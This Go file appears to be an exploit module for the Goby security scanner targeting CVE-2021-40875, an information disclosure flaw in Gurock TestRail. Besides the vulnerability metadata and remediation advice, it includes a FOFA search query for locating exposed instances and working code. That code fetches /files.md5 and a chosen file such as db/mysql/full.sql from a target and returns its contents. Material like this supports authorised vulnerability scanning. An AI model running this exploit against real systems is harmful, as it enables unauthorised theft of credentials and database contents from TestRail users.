package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Gurock Testrail 7.2 Information leakage (CVE-2021-40875)",
    "Description": "<p>Testrail is a complete web-based test case management solution to efficiently manage, track, and organize your software testing efforts.</p><p>Improper Access Control in Gurock TestRail versions </p>",
    "Impact": "Gurock Testrail 7.2 Information leakage (CVE-2021-40875)",
    "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: <a href=\"https://www.gurock.com/testrail/\">https://www.gurock.com/testrail/</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "Testrail",
    "VulType": [
        "Information Disclosure"
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "Translation": {
        "CN": {
            "Name": "Gurock Testrail 7.2 版本信息泄露漏洞 （CVE-2021-40875）",
            "Description": "<p>Testrail一个完整的基于 Web 的测试用例管理解决方案，可有效管理、跟踪和组织您的软件测试工作。</p><p>Gurock TestRail 版本 < 7.2.0.3014 中不正确的访问控制导致敏感信息暴露。威胁行为者可以访问 Gurock TestRail 应用程序客户端的 /files.md5 文件，公开应用程序文件的完整列表和相应的文件路径。可以测试相应的文件路径，并且在某些情况下，会导致硬编码凭据、API 密钥或其他敏感数据的泄露。</p>",
            "Impact": "<p>Gurock TestRail 版本 < 7.2.0.3014 中不正确的访问控制导致敏感信息暴露。威胁行为者可以访问 Gurock TestRail 应用程序客户端的 /files.md5 文件，公开应用程序文件的完整列表和相应的文件路径。可以测试相应的文件路径，并且在某些情况下，会导致硬编码凭据、API 密钥或其他敏感数据的泄露。</p>",
            "Recommendation": "<p>厂商暂未提供修复方案，请关注厂商网站及时更新: <a href=\"https://www.gurock.com/testrail/\">https://www.gurock.com/testrail/</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Product": "Testrail",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "Gurock Testrail 7.2 Information leakage (CVE-2021-40875)",
            "Description": "<p>Testrail is a complete web-based test case management solution to efficiently manage, track, and organize your software testing efforts.</p><p>Improper Access Control in Gurock TestRail versions < 7.2.0.3014 resulted in sensitive information exposure. A threat actor can access the /files.md5 file on the client side of a Gurock TestRail application, disclosing a full list of application files and the corresponding file paths. The corresponding file paths can be tested, and in some cases, result in the disclosure of hardcoded credentials, API keys, or other sensitive data.</p>",
            "Impact": "Gurock Testrail 7.2 Information leakage (CVE-2021-40875)",
            "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: <a href=\"https://www.gurock.com/testrail/\">https://www.gurock.com/testrail/</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Product": "Testrail",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "FofaQuery": "title=\"Login - TestRail\"",
    "GobyQuery": "title=\"Login - TestRail\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://www.gurock.com/testrail/",
    "DisclosureDate": "2021-09-22",
    "References": [
        "https://nvd.nist.gov/vuln/detail/CVE-2021-40875"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "6.0",
    "CVEIDs": [
        "CVE-2021-40875"
    ],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "filepath",
            "type": "createSelect",
            "value": "files.md5,db/mysql/full.sql",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [
            "Testrail"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10225"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri1 := "/files.md5"
			cfg1 := httpclient.NewGetRequestConfig(uri1)
			cfg1.VerifyTls = false
			if resp1, err := httpclient.DoHttpRequest(u, cfg1); err == nil {
				return resp1.StatusCode == 200 && strings.Contains(resp1.RawBody, "app/controllers") && strings.Contains(resp1.RawBody, "app/config")
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["filepath"].(string)
			uri := "/" + cmd
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 {
					expResult.Output = resp.RawBody
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
